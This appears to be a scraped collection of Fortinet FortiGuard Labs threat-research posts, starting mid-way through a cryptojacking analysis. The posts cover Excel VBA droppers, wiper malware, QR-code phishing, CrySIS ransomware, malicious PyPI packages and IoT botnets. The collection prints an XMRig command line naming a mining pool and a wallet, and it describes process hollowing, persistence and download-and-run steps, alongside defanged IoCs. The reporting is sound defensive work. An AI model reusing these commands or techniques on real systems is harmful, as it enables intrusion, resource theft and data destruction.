suspended new process of “AddInProcess.exe”. Other than the Creation Flag to API CreateProcess(), it also has a Command Line parameter, like “C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe -o xmr.2miners.com:13333 -u 88hKxLYFGsx4U{…}eF.Rig998 -p x --tls --algo rx/0 --cpu-max-threads-hint=50\". The parameter string is from the response object (refer to Figure 4.4). It is not a parameter to the created “AddInProcess.exe” but for the xmrig.exe that has been injected into it. The following table contains a description for each of the options: -o, --url=URL It specifies the mining server and port. -a, --algo=ALGO It specifies mining algorithm to be used. -u, --user=USERNAME It is the hacker’s wallet address. -p, --pass=PASSWORD It is the password for mining server. --tls It enables SSL/TLS support. --cpu-max-threads-hint=N It specifies the maximum CPU threads count (in percentage) hint for autoconfig Figure 6.2 shows how XMRig is mining Monero for the attacker. In this analysis, we walked through the entire process, from executing the VBA code in the Excel document to downloading an executable file (template.exe or GHJFRGUNL.exe). Next, I explained how the payload .Net module is extracted from the executable file and executed. Then, you learned how the malware communicates with its C2 server and what control data (Monero miner) is received. Last, I elaborated on how it injects a Monero miner into another process (“AddInProcess.exe”) by executing process hollowing to mine Monero on the attacker’s behalf. Below is a workflow chart that depicts the entire process. Fortinet customers are already protected from this campaign with FortiGuard’s Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious VBA project inside the Excel document. The relevant samples are covered and blocked by the FortiGuard Antivirus service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. URLs: hxxps://www[.]tractorandinas[.]com/wocontent/templates[.]exe hxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21132&authkey=AJUNOnV3DDTyOJw hxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21131&authkey=ANCBF29YwxfXxd4 C2 Server List: dnuocc[.]com:9077 dnuocc[.]com:9078 Relevant Sample SHA-256 [Pago.xls] EF02701E2196F54B5858BCB67A41D34FC9A5F248EFDAE181C701C200950D638D [makbuzu.xls] 68346D23F359A27744B49D6EA9BD229F2929D1CEE057670D2BA73545C0BA427D [Pago_detalles.xls] 417AE2D5F5111DDF80B63C443E14B70EC2052B3E64A35940C9F81F262F7E526E [templates.exe / GHJFRGUNL.exe] 8A2194A75F972890729328A15A01B34E327A0145A6121098315AF9ECBF86ED67 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. threat research,crypto,vba,excel,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-code-cryptojacks-device-to-mine-for-monero-crypto"
  },
  {
    "title": "FortiGuard Outbreak Alerts - 2022 Annual Report",
    "content": "FortiGuard Labs Threat Research Outbreaks have been a continued and critical element of 2022—no, not that type of outbreak. We’re talking about FortiGuard Outbreak Alerts. During the SolarWinds Orion supply chain attack at the end of 2020, a number of our customers asked us to help them determine whether their Fortinet solutions had protected them against its multiple attack vectors, malware, resulting lateral movement, and command and control activity. While all of this information existed, we wanted to make it more readily available for customers. So, to help our customers more rapidly determine whether they had been protected against an attack and to better enable rapid threat hunting to identify Indicators of Compromise (IoCs) across their network, we developed theFortiGuard Outbreak Alertsand correspondingFortiGuard Outbreak Detection Service. In the years since, we have enhanced this service to include the following: These enhancements enable customers to react quickly to emerging outbreaks with factual, actionable intelligence. In 2022, FortiGuard IPS and FortiGuard AV/Sandbox blocked three trillion and six trillion hits, respectively, from vulnerabilities, malware, and 0-day attacks. Those hits encompassed several thousand varieties of remote code lifecycle components, including attack execution,cross-site scripting(XSS), the elevation of privilege, denial of service (DoS and DDoS), Trojans, and other exploits. FortiGuard Labs also alerted customers to numerous critical threats throughout the year based on factors such as proof-of-concept, attack vectors, impact, ease of attack, dependencies, and more. This annual report covers: Followthis linkto the full 2022 Outbreak Alert Report. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. FortiGuards Labs,framework FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-outbreak-alerts-2022-annual-report"
  },
  {
    "title": "The Year of the Wiper",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has been actively tracking wiper malware targeting Ukrainian organizations since the start of the 2022 Russia-Ukraine conflict. The sudden spike in wiper malware began early in the year with numerous new wiper samples targeted at Ukraine. It displayed a side of cyberattacks we rarely see: pure destruction. We published anarticlelast April 2022 to help people understand the context, history, and technical setup of wiper attacks. This post focuses on what happened the rest of the year and how wiper malware and their attack scenarios have changed. Affected Platforms:MultipleImpacted Users:Large organizationsImpact:Data loss and OS and file corruptionSeverity Level:High Since that last report, quite a few new samples have been launched. Figure 1 shows an updated version of a timeline we have used in the past. In April, we were already surprised by the significant increase in wipers. As you can see, it increased even further over the rest of the year. Much of the wiper malware seen in the first half of 2022, whether attributed or not, was deployed against Ukrainian organizations. These include HermeticWiper, CaddyWiper, IsaacWiper, WhisperGate, and others. When you think about it, the growth in wiper malware during a conflict is hardly a surprise. It can scarcely be monetized. The only viable use case is destruction, sabotage, and cyberwar. One interesting event was the AcidRain wiper malware that targeted the satellite modems of a global satellite communications provider, which caused modems to lose connections to their satellite network. The message was clear: even if a cyberattack is used to target Ukraine, its effects can easily spill over and affect other countries and organizations. It is vital that we track these new highly malicious attacks. As the year progressed, pro-Russian hacktivism also increased. We saw that in our telemetry, showing, for example, an increase in DDOS attacks in Nordic countries, especially Finland (Figure 2). However, hacktivism is usually associated with DoS and defacement attacks. But this time, some actors began repurposing their ransomware as wipers by not providing a decryption key. And if no decryption is provided, then ransomware essentially acts as a wiper. We saw actors begin to do this intentionally. For instance, the Somnia ransomware was deployed at several Ukrainian organizations. The attackers compromised systems using a fake software installer and established a persistent presence. Like most ransomware attacks, they exfiltrated data and kept their access as long as needed. But at the end of the attack, no decryptor was offered, meaning the files remained encrypted and useless. The most intriguing wiper we documented in the second half of 2022 was one named ‘Azov.’ Its second version quickly drew media attention because it delivered a message written in the name of well-known security researchers. These researchers denied any connection to the malware. It also delivered a pro-Ukrainian message claiming it was using the malware to draw more attention to the Ukraine-Russia war. However, so far, no attribution has been made. However, as it turned out, the message was not the most interesting part of the malware. It is also very compelling from a technical perspective. First, it was written in the assembly language and built with the FASM tool. This is unusual because most new malware is written in languages such as python, .NET or C/C++. It also contradicts everyone’s first impression that it was a prank used to blame security researchers. However, it seems unlikely that anybody would go to the effort to write malware in assembly just for a joke. It also implements polymorphic code creation to inject itself into legitimate EXE files on the infected machine. It then executes a backdooring function by injecting a modified version of itself into EXE files. This provides persistence to the malware because it can run again once the backdoored files are executed. It also implements a variety of anti-analysis techniques: All this demonstrates that this malware was not created for fun. It is a sophisticated wiper that implements a variety of modern techniques, clearly showing that a sophisticated threat actor. Ransomware authors understand that encryption speed is often crucial for a successful operation. Once encryption is started, they are in a race against the incident response team, who might detect them at any time. As a result, performance optimization was developed. Some new ransomware now implements a multi-threaded architecture that enables it to run multiple encryption threads in parallel. Other operators have realized that encrypting files in their entirety is time-consuming—and may not even be necessary. The BlackCat ransomware, for instance, implements multiple different encryption strategies with varying improvements in performance (see thisVirusBulletin presentation). A similar problem exists for wipers. Traditionally, wipers would erase an entire disk using a kernel driver, delete files using different techniques, and/or alter the content of files (more on techniques in ourlast article). These all take time. As a result, some authors began experimenting with performance optimization. The DoubleZero wiper, for instance, only erases the first 4096 bytes of targeted files. This means that most of the data in an average file would not be erased. However, it’s also true that restoring these files at scale would be very impractical. For instance, modern Microsoft .docx files are essentially a collection of compressed XML files. Deleting the first 4096 bytes from them would corrupt the compression and the generic file structure, meaning these files would not work anymore. Recreating a functioning file with manual forensic work might be possible, but it is simply not feasible when dealing with hundreds or thousands of files. The Azov wiper also implemented a somewhat more optimized wiping process. It does not remove all data in each file. Instead, it only targets 666 bytes in an alternating pattern (666 bytes overwritten, 666 bytes intact, 666 bytes overwritten, etc.) up to 4 GB. OT environments also saw their fair share of wipers. We already mentioned the attack against the satellite provider (and, by extension, the German windmills). Another interesting attack using the Industroyer.V2 malware targeted a Ukrainian high-voltage electric substation. That attack aimed to manipulate the electric relays to take the substation offline. In the context of OT, I would consider the use of the Industroyer.V2 malware in this context as a wiper. Traditional IT wipers have the goal of destroying the crown jewels of IT, the data. Industroyer.V2 was used to destroy the crown jewel of that substation, its operation. If this was not enough, the Industroyer.V2 malware was deployed along with three other wipers, potentially from different actors: This helps serve as a reminder that OT environments are being actively targeted by different threat actors, ranging from ransomware operators to state-sponsored APTs. An interesting new project to pay attention to is the Endurance wiper. It is an open-source wiper that seemingly aspires to become ransomware. Figure 3 shows the malware’s features and readiness state as described by the author. Currently, Endurance’s file-wiping capabilities offer three wiping modes, with each mode defining how many times content should be overwritten. It also offers CONTENT deletion and FILE deletion functions. The CONTENT deletion (Figure 4) function is responsible for overwriting the contents of a file on disk. The FILE deletion function (Figure 5) updates all file attributes and then erases the file from the disk. This tool is actively in development, although at the time of testing, we had to fix the code  build it. Since it is open-source, this could provide an easy entry point for attackers wanting to join the wiper/ransomware game. 2022 provided us with new perspectives on destructive malware. We saw different wiping techniques, different motivations, and differentmotivations, actors, and deployment scenarios. New wiper instances, such as the Azov and Endurance wipers, show that actors are actively engaged in increasingly malicious activity. They are also trying to address shorter threat detection and response time by effectively optimizing the performance of their wiping strategies. And we are also seeing increased attention being paid to OT networks, such as the example of the Industroyer.V2 malware. The point is clear. The gloves are off as threat actors increasingly engage in attacks designed with one purpose: to destroy their targets. The Fortinet Antivirus engine protects against all binaries discussed in this report using the following signatures: W32/KillDisk.NCV!tr W32/Agent.OJC!worm W32/KillMBR.NHQ!tr W32/CaddyWiper.NCX!tr W32/KillFiles.NKU!tr.ransom W32/KillMBR.NGI!tr MSIL/Agent.FP!tr.dldr MSIL/Agent.QWILJV!tr W32/KillFiles.NKU!tr.ransom MSIL/VVH!tr MSIL/Agent.VVH!tr W32/DISTTRACK.C!tr W32/Generic.BQYIIWO!tr W64/DistTrack.A!tr W32/Ordinypt.5873!tr.ransom W32/OlympicDestroyer.A!tr W32/Petya.EOB!tr W32/Petya.A!tr.ransom W64/Petya.BG!tr W32/Agent.F0FC!tr W64/Dustman.KH!tr W32/Distrack!tr W32/Agent.XACVYS!tr W32/Distrack!tr MSIL/DZeroWiper.CK!tr ELF/AcidRain.A!tr MSIL/KillMBR.X!tr MSIL/KillDisk.I!tr W32/PossibleThreat The FortiGuard Web Filtering service rates the C2 server as ‘Malicious’ and blocks it accordingly. FortiMail and FortiSandbox detect and quarantine the malicious attachments in this campaign, and Fortinet’s CDR (Content Disarm and Reconstruction) service can disable them. FortiEDR natively detects and blocks the malicious executables identified in the report based on their behavior. In addition to these protections, Fortinet can help train users to detect and understand phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE trainingprogram—NSE 1 – Information Security Awareness—includes a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. 650f0d694c0928d88aeeed649cf629fc8a7bec604563bca716b1688227e0cc7e - Azov 100c5e4d5b7e468f1f16b22c05b2ff1cfaa02eafa07447c7d83e2983e42647f0 - Somnia_07_08_22_with_FunnySomnia.rar ac5e68c15f5094cc6efb8d25e1b2eb13d1b38b104f31e1c76ce472537d715e08 - Somnia_07_08_22_with_FunnySomnia.exe (Somnia) 99cf5c03dac82c1f4de25309a8a99dcabf964660301308a606cdb40c79d15317 - 1.exe (Cobalt Strike Beacon) 156965227cbeeb0e387cb83adb93ccb3225f598136a43f7f60974591c12fafcf - funnysomnia.exe e449c28e658bafb7e32c89b07ddee36cadeddfc77f17dd1be801b134a6857aa9 - text.exe (Somnia*) fbed7e92caefbd74437d0970921bfd7cb724c98c90efd9b6d0c2ac377751c9e5 - Ip_scanner.zip 06fe57cadb837a4e3b47589e95bb01aec1cfb7ce62fdba1f4323bb471591e1d2 - Ip_scanner.exe (Themida; Vidar) 1e0facd62d1958ccf79e049270061a9fce3223f7986c526f6f3a93ef85180a72 - Ip_scanner_unpacked.exe (Vidar) 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe – DoubleZero 931b6b29e13d76a0e2e1e8b6910873d5ff7b88fd8c51cadf46057e47b695f187 – Endurance BDF8B53D73CA1ED1B649B32A61608B2CF952397EF3D5FC2E6E9F41AD98C40110 – Cry Wiper 91a9180a9cf7674c34ed53a8aa4e36b798334d1f448aeaf1afb9add4fd322b6e – Fantasy 0ad0cd07ca69d8fd2b075fef6e6dd5e9f7debca92af3a6b84d83e51e23bc182d – Bruh Wiper Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. threat research,FortiGuards Labs,ukraine,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/the-year-of-the-wiper"
  },
  {
    "title": "QR Code Phishing Attempts to Steal Credentials from Chinese Language Users",
    "content": "FortiGuard Labs Threat Research Every day, millions of internet and application users enter the ubiquitous username and password in the myriad of places where they shop, work, pay bills, socialize, and stream entertainment. This practice carries significant risk. If one of those locations is compromised, that username and password information usually finds its way to dark web markets where it is offered for sale. And those credentials can be very valuable (and costly to the owner!) if they can be reused in places like a financial institution or online shopping site that have monetary value for the criminal. Affected Platforms:Mobile and DesktopImpacted Users:Mobile and DesktopImpact:Potential to steal credentialsSeverity Level:Medium Cybercriminals use a variety of techniques designed to steal credentials. FortiGuard Labs recently discovered an interesting phishing campaign using a variety of QR codes to target Chinese language users. It aims to steal credentials by luring users into entering their data into a phishing website owned by the threat actor. The e-mail is reasonably simple and streamlined and contains a Microsoft Word attachment. The e-mail attempts to spoof the Chinese Ministry of Finance. Translated to English, the e-mail subject in Figure 1 reads: “Re: Notice on the application for personal labor subsidies in 2022”. The body states, “Please click on the attachment to view the notification of the Ministry of Finance's application for personal labor subsidies in the fourth quarter of 2022!”. The Microsoft Word attachment, “转发：关于财四季度个人劳动补贴申领通知.docx” translates to: “Forward: Notice on Application for Personal Labor Subsidy in the Fourth Quarter of Fiscal Year.docx.” 转发：关于财四季度个人劳动补贴申领通知.docx Once the attachment is opened, the user is presented with some text and a large QR code in the center of the document. A QR code requires an application to read and translate it into something actionable. Most mobile phones have this functionality through their camera, and software packages are available on all major platforms to do this from a computer. In each of the examples FortiGuard Labs found, the QR code contained in the Microsoft Word attachments provided a URL for the user to follow. When the user does this using their desktop platform or mobile device, they arrive at a website controlled by the threat actor. FortiGuard Labs reviewed the linked website. It is a spoofed facsimile of a DingTalk instance (it should be noted that as of the publication date, this site is now offline).DingTalkis a broadly used enterprise communication platform developed by Alibaba Group. Given the reach of the platform and its large number of users, credentials for it would be valuable. The user is directed to a pop-up message box that suggests their DingTalk account has committed some unspecified business violation(s) and that it will be frozen without verification in 24 hours. After acknowledging the message box, the user is invited to enter their credentials to address the issue. Credentials provide a valuable resource for criminals and threat actors by providing a direct route into a victim’s applications or environment. These may be used directly or sold to another group for use in their operations. This example shows that attackers are putting significant effort into ensuring their landing pages look as realistic as possible and that their lures can convince victims to let down their guard. Whatever the attacker's motives, these attacks will undoubtedly be prevalent for some time. Users are cautioned to verify emails, not open attachments or links, and never enter credentials into a site they have not seen before. Rather than using a received link, users are encouraged to go to the known main site of the vendor to conduct any business. Users can also hover over a link to look for an unusual URL. Organizations are also encouraged to provide training to users to help them identify and avoid malicious email attachments and links. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog MSWord/Phish.CCFD!tr Data/Phish.9C34!phish The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. IOCs File-based IOCs: Filename SHA256 重要通知.docx (Important Notice.docx) 939656a000b7ca2f54bc42d635537261ce5194e2041f1c3ac37e3c72f8ec5333 转发：关于财四季度个人劳动补贴申领通知.docx (Forward: Notice on Application for Personal Labor Subsidy in the Fourth Quarter of Fiscal Year.docx) f941b76a33b5a1d425569a0ed689023597fd7fc3acb301ec11a37feb71dcb597 财务重要通知.docx (Financial Important Notice.docx) ac5f4ba15e883813b3018614887b8f65b2f90d252ab7cdffe6f05f8482e1672a Network-based IOCs: IOC IOC type hXXp://w.mryrej.cn Credential theft site hXXps://l99etsen5677cryptorgacme.h7g33.cn Credential theft site hXXp://www.sgiabuq189qhijl.cn Credential theft site Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered SecurityServices portfolio.Sign upto receive our threat research blogs. threat research,email phishing,phishing,FortiGuards Labs,qr FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/qr-code-phishing-attempts-to-steal-credentials-from-chinese-language-users"
  },
  {
    "title": "Ransomware Roundup – Playing Whack-a-Mole with New CrySIS/Dharma Variants",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report provides readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers variants of the CrySIS/Dharma ransomware family. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High The CrySIS/Dharma ransomware family has been around for several years – dating to at least 2016. It nominally operates using a Ransomware-as-a-Service (RaaS) model. However, it should also be noted that at least one version of the ransomware had its source code leaked, allowing anyone to purchase and repurpose it for their own ends. Due to this proliferation of versions, it’s become a game of “whack-a-mole” when new ones pop up with different operators. Several methods have been used by CrySIS/Dharma operators to gain access to an environment—most famously, exposed Microsoft Remote Desktop Protocol (RDP) servers. It has also been delivered via phishing with attachments disguised as installation files for legitimate software, including AV vendors. When launched, the ransomware sets the console to codepage 1251, which covers the ability to use Cyrillic languages such as Russian, Ukrainian, and Bulgarian. It also deletes shadow copies of the system to hamper any attempts at recovery. An additional copy of the ransomware is copied to the host’s “~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” folder to ensure it runs in the event the system is restarted before encryption has occurred. All files of interest, such as personal and operational documents (it does not touch system files), are then subjected to encryption. Encrypted files have an extension generally referring to the threat actor controlling the ransomware. These tend to vary widely, as seen in the following images. In an unusual step, once encryption is complete, the malware launches the Microsoft HTML Application (MSHTA) to process and display a file called “Info.hta”. Copies of this file are stored in four separate locations on the host: “Info.hta” is essentially an HTML file containing the ransom's details. While there are variations in the ransom notes, all contain a method to contact the attacker to discuss the details of the ransom. A unique ID, which appears to be based on the characteristics of the victim system, is also displayed. In addition to its “Info.hta” file, a separate file called “info.txt” is also dropped. It contains a truncated set of instructions to contact the attacker. A copy is dropped at the following locations: Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known CrySIS/Dharma ransomware variants with the following AV signatures: File-based IOCs: SHA256 419bc8196013d7d8c72b060da1a02d202d7e3eb441101f7bcb6d7667871a5c16 5c2fb1c42f007093be5e463f70ee7e7192990b3385a3cbcc71043980efa312e0 6a0017262def9565b504d04318c59f55bea136ac3dd48862d1ae90ff6b963811 b557bf11d82d3d64d028a87584657d25dba0480295ed08447f10c7a579dee048 b3984a2de76eee3ad20c4b13e0c0cbbab2dd6db65e3f6ca34418e79c21cf5c39 e9253218e30b30c8bb690b2ab02eef47b8b5c8991629d814b2af6664151e9a2f Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,Ransomware Roundup,ransomware,wiper malware,CrySIS Dharma FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-playing-whack-a-mole-with-new-crysis-dharma-variants"
  },
  {
    "title": "Supply Chain Attack Using Identical PyPI Packages, “colorslib”, “httpslib”, and “libhttps”",
    "content": "FortiGuard Labs Threat Research TheFortiGuard Labsteam has discovered a new 0-day attack embedded in three PyPI packages (Python Package Index) called ‘colorslib’, ‘httpslib’, and “libhttps”. They were found on January 10, 2023, by monitoring an open-source ecosystem. The Python packages “colorslib” and “httpslib” were published on January 7, 2023, and “libhttps” was published on January 12, 2023. All three were published by the same author, ‘Lolip0p’, as shown in the official PyPI repository.  ‘Lolip0p’ joined the repository close to the publish date. The author puts the project description that may look legitimate and clean as shown below. All versions of these packages are malicious. Interestingly, when we look at the setup.py script for these packages, we find they are identical. They try to run a PowerShell with a suspicious URL that needs further analysis: https://dl[.]dropbox[.]com/s/mkd3enun97s8zag/Oxzy[.]exe?dl=0 As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable is called ‘Oxyz.exe’. It drops another executable, ‘update.exe’, that runs in the folder ‘%USER%\\AppData\\Local\\Temp\\’ As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757 When running ‘update.exe’, it drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’. The dropped file, ‘SearchProtocolHost.exe’, is flagged as malicious by several vendors (SHA 256): 123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638 In this blog, we showed a single author posting separate Python packages that use the same code to launch an attack. The author also positions each package as legitimate and clean by including a convincing project description. However, these packages download and run a malicious binary executable. Python end users should always perform due diligence before downloading and running any packages, especially from new authors. And as can be seen, publishing more than one package in a short time period is no indication that an author is reliable. FortiGuard AntiVirus detects the malicious executables identified in this report as Oxzy.exe:Malicious_Behavior.SB update.exe:PossibleThreat.PALLASNET.H SearchProtocolHost.exe:Malicious_Behavior.SB TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. Oxzy.exe 8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b update.exe 293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757 SearchProtocolHost.exe 123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638 Malicious URLs https://dl[.]dropbox[.]com/s/mkd3enun97s8zag/Oxzy[.]exe?dl=0 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered SecurityServices portfolio.Sign upto receive our threat research blogs. threat research,security attack,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-using-identical-pypi-packages-colorslib-httpslib-libhttps"
  },
  {
    "title": "2022 IoT Threat Review",
    "content": "FortiGuard Labs Threat Research FortiGuard Labsmonitors the IoT botnet threat landscape for new and emerging campaigns. We do this with the assistance of our honeypots we have deployed to capture active attacks in the wild. This article provides insights into the data collected from our monitoring system over the past year. Affected Platforms:Linux Impacted Users:Any organization Impact:Remote attackers gain control of the vulnerable systems Severity Level:Critical Our distributed honeypot systems allow us to capture and monitor campaigns that are actively targeting IoT devices for infection. In most cases, these devices are turned into bots used to perform Distributed Denial of Service (DDoS) attacks. These malware campaigns primarily brute force Telnet and SSH credentials to gain access to IoT devices and then execute their bot binaries. In 2022, a total of over 20 million successful brute force attacks were recorded by our system. Figure 1 shows the number of successful brute force attacks against our honeypots by month. Based on 121,799 unique attacker IPs observed in 2022, see a breakdown of where IPs were hosted by country (Figure 2). In terms of attack volume, see a breakdown of where the majority originate from based on where servers are hosted (Figure 3). Aside from brute forcing credentials to infect devices, IoT malware also takes advantage of vulnerabilities to spread, such as in theBeastmode Miraicampaign we discussed in April. Our monitoring system identifiespossible exploitation requests being used by malware samples. From over a hundred vulnerabilities targeted by IoT malware samples that were captured last year, we primarily observed attempts to exploit CVE-2017-17215, an old Remote Code Execution (RCE) vulnerability targeting Huawei HG532 routers. In fact, over 30% of the malware samples containing embedded exploits target this vulnerability (Figure 4). In terms of the actual volume of attacks in the wild, based on 30-day Fortinet IPS telemetry, we can see that the IPS signatureHuawei.HG532.Remote.Code.Executiondetected efforts to exploit CVE-2017-17215. We captured an average of 80,000 daily detections, peaking at 160,000. We also found the following CVEs from 2022 being targeted: It is important to note that although there were attempts to target Local File Inclusion (LFI) vulnerabilities, they were not properly implemented to successfully exploit them. The most actively exploited vulnerability from the list above is the CVE-2022-22954. It targeted VMware Workspace ONE Access. TheVMware.Workspace.ONE.Access.Catalog.Remote.Code.ExecutionIPS signature recorded an average of 80,000 daily detections based on a 30-day Fortinet IPS telemetry. Ourpostfrom October noted that this vulnerability is also a hot target for other non-IoT malware campaigns. We also observed that the F5 BIG-IP iControl CVE-2022-1388 (F5.BIG-IP.iControl.REST.Authentication.Bypass) was another popular vulnerability, experiencing a daily average of 25,000 hits, peaking at 50,000. Based on our research, the majority of IoT malware is built to run on an ARM 32-bit architecture— comprising almost three-quarters of all samples captured (Figure 8). The “script file” label is for plaintext Bash scripts with the purpose of downloading and installing the payload binary after brute forcing or exploitation. Figure 9 shows the most common malware families detected by our systems, grouped by month. Mirai and Gafgyt variants are predominant, with Kyton, a Gafgyt/Mirai hybrid, being one of the most heavily distributed families in terms of volume. Being a Gafgyt/Mirai hybrid, Kyton reuses code from other Mirai variants to exploit CVE-2017-17215 (Huawei Router HG532), JAWS Webserver RCE, or CVE-2014-8361 (RealtekSDK). Samples tagged as_unknownon the graph (Figure 9) are malware yet to be linked to any known malware campaigns. They could be fresh botnets infecting our honeypots. As shown in the Figure 9 statistics, while most of the active IoT botnets last year were based on Mirai and Gafgyt, there were several campaigns that stood out from the crowd. In mid-March, for example, we encounteredEnemybot, which at the time was the latest botnet campaign from the threat group Keksec. It was a hybrid of Gafgyt and Mirai and was using the TOR network to mask its real Command and Control (C2) servers. RapperBotis a DDoS botnet that we encountered in mid-June. This malware is interesting because it was using an embedded SSH client to spread and because we observed unusual changes to its variants that made us question its primary motivation. In October 2022, we observed a newcampaignfrom potentially the same threat actors targeting servers for popular games. Lastly,Zerobotis a DDoS botnet written in the Go programming language (also known as Golang) that FortiGuard Labs first encountered in November 2022. It utilizes both old and recent vulnerabilities to spread, 